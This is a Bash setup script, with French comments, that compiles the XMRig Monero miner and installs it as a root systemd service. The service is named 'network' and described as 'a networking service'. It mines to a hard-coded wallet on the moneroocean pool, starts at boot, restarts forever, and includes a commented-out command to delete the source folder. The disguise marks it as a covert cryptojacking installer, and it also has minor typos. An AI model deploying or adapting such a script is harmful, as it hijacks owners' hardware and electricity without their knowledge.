#!/bin/bash

SERVICE_NAME="network"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
LOG_PATH="/home/pi/network.log"
GIT_REPO_PATH=$(realpath .)

# Update and upgrade system packages
sudo apt -y update
sudo apt -y upgrade

# Install required dependencies
sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y

cd /var/tmp

# Clone the XMRig repository
git clone https://github.com/xmrig/xmrig.git

# Navigate to the cloned repository
cd xmrig

# Create and enter the build directory
mkdir build
cd build

# Configure the build system
cmake ..

# Compile the project
make

BUILD_PATH=$(realpath xmrig)

echo "Creation du service $SERVICE_NAME..."

# Verifier si le service existe deja
if [ -f "$SERVICE_FILE" ]; then
    echo "Le service $SERVICE_NAME existe deja. Voulez-vous le recreer ? (o/n)"
    read -r reponse
    if [ "$reponse" != "o" ]; then
        echo "Annulation."
        exit 0
    fi
    systemctl stop "$SERVICE_NAME"
fi

bash -c "cat > $SERVICE_FILE" <<EOF
[Unit]
Description=a networking service
After=network target

[Service]
ExecStart= /bin/bash -c './xmrig -o gulf.moneroocean.stream:10128 -u 4AD4TDproP59Vk2SVd2SPr7zkzUBEyHD87GnKgGXZsxHRPiKVBf8H381UBeAcwu2Mtg5rHnGKzZCPhL3MFiGHBxY3jbKdWY -p piner'
WorkingDirectory=$(dirname "$BUILD_PATH")
StandardOutput=file:$LOG_PATH
StandardError=file:$LOG_PATH
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

echo "Service $SERVICE_NAME cree avec succes."

#Recharger systemd, activer et demarrer le service
echo "Activation et demarrage du service..."
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

sleep 2

systemctl status "$SERVICE_NAME" --no-pager

#rm -rf $GIT_REPO_PATH

echp $GIT_REPO_PATH